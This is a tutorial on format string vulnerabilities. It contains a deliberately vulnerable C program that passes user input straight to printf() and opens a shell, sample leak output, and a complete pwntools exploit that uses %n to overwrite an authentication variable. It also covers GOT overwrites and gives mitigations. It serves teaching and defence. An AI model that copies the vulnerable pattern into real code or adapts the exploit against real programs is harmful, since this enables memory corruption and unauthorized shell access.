# Format String Vulnerabilities

## Overview

A **format string vulnerability** occurs when user-controlled input is passed directly as the format string argument to functions like `printf()`, `sprintf()`, or `fprintf()`. This allows attackers to read from or write to arbitrary memory locations.

---

## Vulnerable C Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int secret_value = 0xDEADBEEF;
int authenticated = 0;

void vulnerable_function(char *user_input) {
    char buffer[64];
    
    // VULNERABILITY: User input used as format string!
    printf(user_input);  // Should be: printf("%s", user_input);
    
    printf("\nYou entered: ");
    printf(user_input);  // Double vulnerability
    printf("\n");
}

void check_auth() {
    if (authenticated == 0x41414141) {
        printf("[!] AUTHENTICATION BYPASSED!\n");
        system("/bin/sh");
    } else {
        printf("Access denied (auth = 0x%x)\n", authenticated);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("Secret value at: %p\n", &secret_value);
    printf("Authenticated at: %p\n", &authenticated);
    
    vulnerable_function(argv[1]);
    check_auth();
    
    return 0;
}
```

### Compilation
```bash
gcc -o format_string format_string.c -no-pie -fno-stack-protector -m32
```

---

## Format String Specifiers

| Specifier | Purpose | Exploitation Use |
|-----------|---------|------------------|
| `%x` | Print hex value from stack | **Leak stack values** |
| `%s` | Print string from pointer | **Leak memory contents** |
| `%p` | Print pointer | **Leak addresses (ASLR bypass)** |
| `%n` | **Write** number of bytes printed | **Arbitrary write primitive** |
| `%hn` | Write 2 bytes (short) | Precise memory writes |
| `%hhn` | Write 1 byte | Byte-by-byte writes |
| `%<num>$x` | Access nth argument | Direct parameter access |

---

## Memory State During printf()

### Stack Layout (x86)

```
Stack Memory (printf call)
┌─────────────────────────────────────┐
│  Return address                     │
├─────────────────────────────────────┤
│  Saved EBP                          │
├─────────────────────────────────────┤  ← EBP
│  Local variables (buffer)           │
├─────────────────────────────────────┤
│  Format string pointer              │  ← 1st argument (user_input)
├─────────────────────────────────────┤  ← ESP (after call)
│  [Expected arguments]               │  ← printf reads from here!
│  (but none provided!)               │
│  ┌─────────────────────────────┐    │
│  │ Stack value 1: 0x00000001   │    │  ← %x reads this
│  │ Stack value 2: 0xffffcf10   │    │  ← %x %x reads this
│  │ Stack value 3: 0x08048520   │    │  ← %x %x %x reads this
│  │ ...                         │    │
│  └─────────────────────────────┘    │
└─────────────────────────────────────┘

When user provides "%x %x %x":
- printf expects 3 arguments after format string
- No arguments provided, so reads from stack
- Leaks arbitrary stack values!
```

---

## Exploitation Techniques

### 1. Stack Reading (Information Disclosure)

**Input:** `AAAA %x %x %x %x %x`

```bash
$ ./format_string "AAAA %x %x %x %x %x"
Secret value at: 0x804c024
Authenticated at: 0x804c028
AAAA f7fc5580 0 ffffcf10 41414141 78257825
```

**Analysis:**
```
AAAA         → Our marker (0x41414141 in hex)
f7fc5580     → Stack value 1 (libc address)
0            → Stack value 2
ffffcf10     → Stack value 3 (stack pointer)
41414141     → Our "AAAA" marker found at position 4!
78257825     → Next stack values ("%x%x" in hex)
```

### 2. Direct Parameter Access

**Input:** `%4$x` (read 4th parameter)

```bash
$ ./format_string "%4\$x"
41414141  # Directly accesses 4th stack position
```

### 3. Arbitrary Read (via %s)

**Input:** `AAAA %4$s` (read string at address 0x41414141)

```
Stack:
┌─────────────────────────────────────┐
│ Format string: "AAAA %4$s"          │
│ Position 1: ...                     │
│ Position 2: ...                     │
│ Position 3: ...                     │
│ Position 4: 0x41414141 ("AAAA")     │  ← %4$s treats this as pointer!
└─────────────────────────────────────┘

printf dereferences 0x41414141 and prints string → Segfault or leak!
```

**Practical Example (leak secret_value):**
```bash
# Place target address on stack, then read it
$ ./format_string $(python3 -c "import sys; sys.stdout.buffer.write(b'\x24\xc0\x04\x08' + b'%4\$s')")
# Reads 4 bytes from 0x0804c024 (secret_value address)
```

### 4. Arbitrary Write (via %n)

**The %n Specifier:**
- Writes the **number of bytes printed so far** to the address in the corresponding argument
- Example: `printf("AAAA%n", &var)` → Writes 4 to `var`

**Exploitation Strategy:**
```
Goal: Write 0x41414141 to authenticated variable

1. Place target address on stack: &authenticated
2. Use %n to write to that address
3. Control number of bytes printed to set desired value
```

**Payload Construction:**
```python
# Target: Write 0x41414141 to authenticated (0x0804c028)
target_addr = 0x0804c028
target_value = 0x41414141  # 1094795585 in decimal

# Payload: [address][padding][%n]
payload = p32(target_addr)  # 4 bytes
payload += b"%1094795581x"  # Print (1094795585 - 4) more bytes
payload += b"%4$n"          # Write total (1094795585) to 4th parameter
```

### Memory State During %n Write

```
Before %n:
┌─────────────────────────────────────┐
│ authenticated: 0x00000000           │  @ 0x0804c028
└─────────────────────────────────────┘

Stack during printf:
┌─────────────────────────────────────┐
│ Format string pointer               │
│ Position 1: ...                     │
│ Position 2: ...                     │
│ Position 3: ...                     │
│ Position 4: 0x0804c028              │  ← Address of authenticated
└─────────────────────────────────────┘

After %n executes:
┌─────────────────────────────────────┐
│ authenticated: 0x41414141           │  @ 0x0804c028 (WRITTEN!)
└─────────────────────────────────────┘
```

---

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./format_string')
context.arch = 'i386'

# Get authenticated variable address from binary
authenticated_addr = binary.symbols['authenticated']
log.info(f"authenticated @ {hex(authenticated_addr)}")

# Target value to write
target_value = 0x41414141

# Build payload
# [address][%<padding>x][%4$n]
payload = p32(authenticated_addr)  # 4 bytes written
remaining = target_value - 4       # Need to print this many more bytes
payload += f"%{remaining}x".encode()  # Padding
payload += b"%4$n"  # Write to 4th parameter (our address)

# Execute
p = process([binary.path, payload])
output = p.recvall()
print(output.decode())
```

---

## Advanced Techniques

### 1. GOT Overwrite

```python
# Overwrite printf@GOT with system()
printf_got = binary.got['printf']
system_addr = binary.symbols['system']

# Write system address to printf GOT entry
# Next printf call → system() instead!
```

### 2. Byte-by-Byte Write (for large values)

```python
# Write 0xdeadbeef using %hhn (1 byte at a time)
writes = {
    target_addr + 0: 0xef,  # LSB
    target_addr + 1: 0xbe,
    target_addr + 2: 0xad,
    target_addr + 3: 0xde,  # MSB
}
payload = fmtstr_payload(offset=4, writes=writes)
```

---

## Mitigation Techniques

| Protection | Implementation | Bypass |
|-----------|----------------|--------|
| **Static Format Strings** | `printf("%s", user_input)` | N/A (proper fix) |
| **FORTIFY_SOURCE** | Compile-time checks | Only catches obvious cases |
| **ASLR** | Randomize addresses | Leak addresses via %p |
| **RELRO** | Make GOT read-only | Target other writable sections |

---

## Key Takeaways

1. **Root Cause:** User input as format string argument
2. **Impact:** Arbitrary read/write, information disclosure
3. **Detection:** Static analysis, grep for `printf(user_*)`
4. **Exploitation:** %x for leaks, %n for writes
5. **Defense:** Always use `printf("%s", input)`

---

## Further Reading

- [Exploiting Format String Vulnerabilities (scut/team teso)](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [pwntools fmtstr module](https://docs.pwntools.com/en/stable/fmtstr.html)
